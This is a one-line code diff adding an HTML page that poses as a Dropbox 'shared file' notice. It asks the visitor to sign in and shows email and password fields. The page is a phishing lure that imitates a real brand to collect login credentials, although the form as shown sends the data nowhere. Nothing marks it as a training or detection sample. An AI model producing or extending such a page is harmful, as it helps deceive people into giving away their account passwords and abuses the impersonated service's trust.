@@ -1,0 +1,1 @@
+<html><body><h1>Dropbox shared file</h1><p>Sign in to your dropbox.com account.</p><form><input name='email'><input name='password' type='password'></form></body></html>
